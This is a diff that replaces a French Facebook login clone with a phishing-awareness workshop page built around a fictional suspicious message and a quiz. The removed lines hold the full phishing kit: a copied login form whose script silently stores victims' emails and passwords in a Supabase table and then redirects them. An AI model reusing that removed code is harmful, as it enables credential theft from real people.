@@ -1,191 +1,83 @@
-<!DOCTYPE html><html lang="fr"><head>
-<meta charset="utf-8">
-<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
-<title>Facebook - Connexion ou inscription</title>
-<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-  tailwind.config = {
-    theme: {
-      extend: {
-        colors: {
-          fbBlue: '#0064e0',
-          fbBlueHover: '#0055be',
-          fbGrayBg: '#f0f2f5',
-          fbTextMuted: '#65676b',
-          fbInputBg: '#ffffff',
-          fbInputBorder: '#ccd0d5',
-        },
-        fontFamily: {
-          sans: ['-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', 'sans-serif'],
-        }
-      }
-    }
-  }
-</script>
-<script>
-  const SUPABASE_URL         = 'https://pjhuhupsxsunwqgcxpai.supabase.co';
-  const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_gogDIO-bFXJVt26GCCijOw_2BBY1FAo';
-</script>
-<style data-purpose="base-typography">
-  body {
-    -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
-    background-color: #ffffff;
-    color: #1c1e21;
-  }
-</style>
-<style data-purpose="custom-elements">
-  button:active { transform: scale(0.99); }
-  input::placeholder { color: #8c949e; font-size: 14.5px; }
-  #loading-spinner {
-    display: none;
-    width: 18px;
-    height: 18px;
-    border: 2px solid #fff;
-    border-top-color: transparent;
-    border-radius: 50%;
-    animation: spin 0.7s linear infinite;
-    margin-left: 8px;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-</style>
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#102a43">
+  <meta name="description" content="Atelier pédagogique pour apprendre à repérer les tentatives d’hameçonnage, sans saisir ni transmettre de données personnelles.">
+  <title>Atelier Vigilance — reconnaître un message suspect</title>
+  <style>
+    :root{color-scheme:light;--ink:#172b4d;--muted:#52647a;--navy:#102a43;--blue:#1769aa;--pale:#eef6fc;--line:#d8e1eb;--green:#176b4b;--red:#a33a32;--shadow:0 12px 32px rgba(16,42,67,.09)}
+    *{box-sizing:border-box}body{margin:0;background:#f4f7fa;color:var(--ink);font:16px/1.6 system-ui,-apple-system,"Segoe UI",sans-serif}a{color:var(--blue)}button{font:inherit}.top{background:var(--navy);color:#fff}.top-inner{max-width:1080px;margin:auto;padding:16px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px}.brand{font-weight:750;letter-spacing:.02em}.badge{border:1px solid #9db8ce;border-radius:999px;padding:4px 11px;font-size:.8rem}.wrap{max-width:900px;margin:42px auto;padding:0 22px}.intro{margin-bottom:26px}.eyebrow{color:var(--blue);font-size:.82rem;font-weight:750;letter-spacing:.08em;text-transform:uppercase}h1{font-size:clamp(2rem,5vw,3rem);line-height:1.12;margin:.35rem 0 1rem}h2{font-size:1.25rem;margin:0 0 12px}.lead{max-width:710px;color:var(--muted);font-size:1.08rem}.notice{background:#e8f4ed;border-left:4px solid var(--green);padding:14px 16px;border-radius:8px;margin:22px 0;color:#194c39}.card{background:#fff;border:1px solid var(--line);border-radius:16px;padding:clamp(20px,4vw,32px);box-shadow:var(--shadow);margin:18px 0}.message{border:1px solid var(--line);border-radius:12px;overflow:hidden}.message-head{background:#f7f9fb;padding:14px 18px;border-bottom:1px solid var(--line);color:var(--muted);font-size:.92rem}.message-body{padding:22px}.message-body p{margin:0 0 12px}.fake-link{display:inline-block;background:var(--blue);color:white;text-decoration:none;padding:9px 14px;border-radius:7px;font-weight:650;margin:4px 0 12px}.hint{font-size:.88rem;color:var(--muted)}.actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:18px}.btn{border:0;border-radius:8px;padding:11px 16px;cursor:pointer;font-weight:700}.btn-primary{background:var(--blue);color:white}.btn-secondary{background:#e9eff5;color:var(--ink)}.btn:hover{filter:brightness(.95)}.btn:focus-visible,a:focus-visible{outline:3px solid #f4bc4b;outline-offset:3px}.clues{padding-left:22px;margin-bottom:0}.clues li{margin:9px 0}.hidden{display:none}.question{font-weight:700;margin-bottom:10px}.choices{display:grid;gap:9px}.choice{text-align:left;border:1px solid var(--line);background:#fff;color:var(--ink);border-radius:8px;padding:11px 13px;cursor:pointer}.choice:hover{border-color:var(--blue);background:var(--pale)}.feedback{margin-top:14px;padding:12px 14px;border-radius:8px;background:#eef6fc}.feedback.good{background:#e8f4ed;color:#194c39}.feedback.bad{background:#fff0ed;color:#7f2d27}.footer{color:var(--muted);font-size:.88rem;text-align:center;padding:24px}.progress{font-size:.9rem;color:var(--muted);margin:0 0 14px}@media(max-width:600px){.top-inner{padding:14px 18px}.wrap{margin:28px auto}.badge{font-size:.72rem}.message-body{padding:17px}}
+  </style>
 </head>
-<body class="min-h-screen flex flex-col justify-between bg-white text-gray-900 selection:bg-blue-100">
+<body>
+  <header class="top"><div class="top-inner"><div class="brand">Atelier Vigilance</div><span class="badge">Simulation pédagogique</span></div></header>
+  <main class="wrap">
+    <section class="intro" aria-labelledby="page-title">
+      <div class="eyebrow">Apprendre à vérifier avant de cliquer</div>
+      <h1 id="page-title">Sauriez-vous repérer un message suspect&nbsp;?</h1>
+      <p class="lead">Examinez cet exemple fictif, identifiez les signaux d’alerte, puis répondez à une courte question. Cette activité ne demande aucun identifiant et ne transmet aucune donnée.</p>
+      <div class="notice"><strong>Cadre sûr :</strong> ce scénario et son organisation sont fictifs. N’entrez jamais de vrai mot de passe dans un exercice de sensibilisation.</div>
+    </section>
 
-<main class="w-full flex-1 flex flex-col items-center justify-between px-5 pt-12 pb-6 max-w-md mx-auto">
-
-  <header class="w-full flex flex-col items-center mt-6 mb-6" data-purpose="brand-header">
-    <div aria-label="Logo Facebook" class="w-14 h-14 text-fbBlue mb-6">
-      <svg class="w-full h-full fill-current" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
-        <path d="M20 40C8.954 40 0 31.046 0 20S8.954 0 20 0s20 8.954 20 20c0 10.05-7.397 18.368-17.031 19.805V25.781h5.059l.963-6.195h-6.022v-4.019c0-1.705.836-3.367 3.513-3.367h2.718V6.924C28.718 6.84 27.234 6.703 25.79 6.703c-5.918 0-9.789 3.588-9.789 10.09v4.793h-5.441v6.195h5.441v14.024C6.397 38.368 0 30.05 0 20" fill="none"></path>
-        <path d="M40 20C40 8.954 31.046 0 20 0S0 8.954 0 20c0 10.05 7.397 18.368 17.031 19.805V25.781h-5.441v-6.195h5.441v-4.793c0-6.502 3.871-10.09 9.789-10.09 1.444 0 2.928.137 3.44.221v5.276h-2.718c-2.677 0-3.513 1.662-3.513 3.367v4.019h6.022l-.963 6.195h-5.059v14.024C32.603 38.368 40 30.05 40 20z" fill="#0064E0"></path>
-        <path d="M27.098 25.781l.963-6.195h-6.022v-4.019c0-1.705.836-3.367 3.513-3.367h2.718V6.924C27.739 6.84 26.255 6.703 24.811 6.703c-5.918 0-9.789 3.588-9.789 10.09v4.793h-5.441v6.195h5.441v14.024c1.077.169 2.179.258 3.297.258s2.22-.089 3.297-.258V25.781h5.482z" fill="#FFFFFF"></path>
-      </svg>
-    </div>
-  </header>
-
-  <section class="w-full flex flex-col items-center" data-purpose="login-section">
-    <h1 class="text-sm font-semibold text-gray-800 text-center mb-4">
-      Se connecter à Facebook
-    </h1>
-
-    <form id="login-form" class="w-full flex flex-col gap-3" data-purpose="login-form" method="POST">
-      <div>
-        <label class="sr-only" for="email">E-mail ou numéro de mobile</label>
-        <input class="w-full h-11 px-3.5 rounded-lg border border-gray-300 focus:border-fbBlue focus:ring-1 focus:ring-fbBlue outline-none text-sm text-gray-900 bg-white placeholder-gray-400 transition" id="email" name="email" placeholder="E-mail ou numéro de mobile" required type="text">
+    <section class="card" aria-labelledby="example-title">
+      <h2 id="example-title">Exemple de message à analyser</h2>
+      <div class="message">
+        <div class="message-head"><strong>De :</strong> Équipe de sécurité &lt;alerte@exemple-invalide.test&gt;<br><strong>Objet :</strong> Action urgente requise aujourd’hui</div>
+        <div class="message-body">
+          <p>Bonjour,</p>
+          <p>Une activité inhabituelle aurait été détectée. Votre accès sera suspendu dans 30 minutes si vous ne confirmez pas immédiatement votre compte.</p>
+          <a class="fake-link" href="#analyse" id="example-link">Vérifier mon compte (lien fictif)</a>
+          <p class="hint">Dans cet atelier, ce bouton ne mène vers aucun formulaire et ne collecte rien.</p>
+        </div>
       </div>
-      <div>
-        <label class="sr-only" for="password">Mot de passe</label>
-        <input class="w-full h-11 px-3.5 rounded-lg border border-gray-300 focus:border-fbBlue focus:ring-1 focus:ring-fbBlue outline-none text-sm text-gray-900 bg-white placeholder-gray-400 transition" id="password" name="password" placeholder="Mot de passe" required type="password">
+      <div class="actions"><button class="btn btn-primary" id="reveal-button" type="button" aria-expanded="false" aria-controls="clues">Afficher les indices</button></div>
+      <div id="clues" class="hidden" tabindex="-1">
+        <h2 style="margin-top:22px">Indices à remarquer</h2>
+        <ul class="clues">
+          <li><strong>Pression et urgence :</strong> la menace d’une suspension imminente cherche à provoquer une réaction précipitée.</li>
+          <li><strong>Expéditeur à vérifier :</strong> l’adresse utilise un domaine d’exemple qui n’est pas celui d’un service officiel.</li>
+          <li><strong>Demande d’action via un lien :</strong> ne vous fiez pas au texte d’un bouton. Vérifiez la destination sans cliquer et passez par le site ou l’application officielle.</li>
+          <li><strong>Manque de contexte précis :</strong> le message reste vague sur l’activité concernée et ne fournit pas de moyen indépendant de vérification.</li>
+        </ul>
       </div>
+    </section>
 
-      <button id="submit-btn" class="w-full h-11 mt-1 bg-fbBlue hover:bg-fbBlueHover active:bg-blue-700 text-white font-medium text-sm rounded-full shadow-none transition duration-150 flex items-center justify-center" data-purpose="submit-login" type="submit">
-        <span id="btn-text">Se connecter</span>
-        <div id="loading-spinner"></div>
-      </button>
-
-      <div class="text-center pt-2 pb-5">
-        <a class="text-xs font-normal text-gray-700 hover:underline" href="#">
-          Mot de passe oublié ?
-        </a>
+    <section class="card" id="quiz" aria-labelledby="quiz-title">
+      <p class="progress">Question de vérification</p>
+      <h2 id="quiz-title">Quelle est la réaction la plus sûre&nbsp;?</h2>
+      <div class="choices" role="group" aria-label="Choisissez une réponse">
+        <button class="choice" type="button" data-correct="false">Cliquer rapidement pour éviter la suspension annoncée.</button>
+        <button class="choice" type="button" data-correct="true">Ne pas utiliser le lien et vérifier en ouvrant moi-même le site ou l’application officielle.</button>
+        <button class="choice" type="button" data-correct="false">Répondre au message en envoyant mon mot de passe pour confirmer mon identité.</button>
       </div>
-    </form>
-  </section>
-
-  <section class="w-full flex flex-col items-center mt-auto" data-purpose="account-creation-and-meta">
-    <div class="w-full mb-6">
-      <a class="w-full h-9 flex items-center justify-center rounded-full border border-fbBlue text-fbBlue font-medium text-xs tracking-tight hover:bg-blue-50 transition" href="#" role="button">
-        Créer un nouveau compte
-      </a>
-    </div>
-    <div class="flex items-center gap-1 text-gray-700 mb-2" data-purpose="meta-logo"></div>
-  </section>
-
-</main>
-
-<footer class="w-full border-t border-gray-200 bg-white py-4 px-4 text-center" data-purpose="page-footer">
-  <div class="max-w-md mx-auto flex flex-col gap-2">
-    <nav aria-label="Langues" class="flex flex-wrap justify-center items-center gap-x-2 gap-y-1 text-[10px] text-gray-500">
-      <span class="font-medium text-gray-600">Français (France)</span>
-      <span>·</span>
-      <a class="hover:underline" href="#">English (US)</a>
-      <span>·</span>
-      <a class="hover:underline" href="#">Português (Brasil)</a>
-      <span>·</span>
-      <a class="hover:underline" href="#">Español</a>
-      <span>·</span>
-      <a class="hover:underline" href="#">Bahasa Indonesia</a>
-      <span>·</span>
-      <a class="hover:underline" href="#">Italiano</a>
-      <span>·</span>
-      <a class="hover:underline" dir="rtl" href="#">العربية</a>
-      <span>·</span>
-      <a class="hover:underline text-gray-700" href="#">Autres langues…</a>
-    </nav>
-    <nav aria-label="Liens d'information et d'assistance" class="flex flex-wrap justify-center items-center gap-x-2 gap-y-1 text-[9px] text-gray-400 pt-1">
-      <a class="hover:underline" href="#">S'inscrire</a>
-      <a class="hover:underline" href="#">Se connecter</a>
-      <a class="hover:underline" href="#">Messenger</a>
-      <a class="hover:underline" href="#">Facebook Lite</a>
-      <a class="hover:underline" href="#">Vidéo</a>
-      <a class="hover:underline" href="#">Meta Pay</a>
-      <a class="hover:underline" href="#">Boutique Meta</a>
-      <a class="hover:underline" href="#">Meta Quest</a>
-      <a class="hover:underline" href="#">Ray-Ban Meta</a>
-      <a class="hover:underline" href="#">Meta AI</a>
-      <a class="hover:underline" href="#">Plus</a>
-      <a class="hover:underline" href="#">Instagram</a>
-      <a class="hover:underline" href="#">Threads</a>
-      <a class="hover:underline" href="#">Politique de confidentialité</a>
-      <a class="hover:underline" href="#">Centre de confidentialité</a>
-      <a class="hover:underline" href="#">À propos</a>
-      <a class="hover:underline" href="#">Créer une publicité</a>
-      <a class="hover:underline" href="#">Créer une Page</a>
-      <a class="hover:underline" href="#">Développeurs</a>
-      <a class="hover:underline" href="#">Emplois</a>
-      <a class="hover:underline" href="#">Cookies</a>
-      <a class="hover:underline" href="#">Choisir sa publicité</a>
-      <a class="hover:underline" href="#">Conditions générales</a>
-      <a class="hover:underline" href="#">Aide</a>
-      <a class="hover:underline" href="#">Importation des contacts et non-utilisateurs</a>
-    </nav>
-    <div class="text-[9px] text-gray-400 mt-1">Meta © 2024</div>
-  </div>
-</footer>
-
-<script>
-  const { createClient } = supabase;
-  const sb = createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
-
-  document.getElementById('login-form').addEventListener('submit', async function(e) {
-    e.preventDefault();
-
-    const email    = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value;
-    const spinner  = document.getElementById('loading-spinner');
-    const btnText  = document.getElementById('btn-text');
-    const btn      = document.getElementById('submit-btn');
-
-    spinner.style.display = 'block';
-    btnText.textContent   = 'Connexion en cours…';
-    btn.disabled          = true;
-
-    try {
-      await sb.from('logins').insert([{
-        email:      email,
-        password:   password,
-        user_agent: navigator.userAgent
-      }]);
-      // Marquer que les données ont été enregistrées
-      localStorage.setItem('fb_sent', email);
-    } catch (err) { /* silent */ }
-
-    // Redirect to error page (2nd step)
-    setTimeout(() => {
-      window.location.href = 'error.html';
-    }, 1500);
-  });
-</script>
-
-</body></html>
+      <div class="feedback hidden" id="feedback" role="status" aria-live="polite"></div>
+    </section>
+    <p class="hint">Conseil : en cas de doute, contactez l’organisation par un canal dont vous connaissez déjà l’adresse. Ne partagez jamais vos codes de connexion.</p>
+  </main>
+  <footer class="footer">Projet pédagogique — aucune donnée personnelle ou donnée de connexion n’est demandée, stockée ou envoyée.</footer>
+  <script>
+    const revealButton = document.getElementById('reveal-button');
+    const clues = document.getElementById('clues');
+    revealButton.addEventListener('click', () => {
+      const opening = clues.classList.contains('hidden');
+      clues.classList.toggle('hidden', !opening);
+      revealButton.setAttribute('aria-expanded', String(opening));
+      revealButton.textContent = opening ? 'Masquer les indices' : 'Afficher les indices';
+      if (opening) clues.focus();
+    });
+    document.getElementById('example-link').addEventListener('click', event => event.preventDefault());
+    const feedback = document.getElementById('feedback');
+    document.querySelectorAll('.choice').forEach(button => {
+      button.addEventListener('click', () => {
+        const correct = button.dataset.correct === 'true';
+        feedback.className = `feedback ${correct ? 'good' : 'bad'}`;
+        feedback.textContent = correct
+          ? 'Bonne réponse. Ouvrez vous-même le site ou l’application officielle et vérifiez l’alerte depuis cette source fiable.'
+          : 'Pas tout à fait. L’urgence et les demandes de mot de passe sont des signaux d’alerte. Vérifiez toujours par un canal officiel indépendant.';
+      });
+    });
+  </script>
+</body>
+</html>
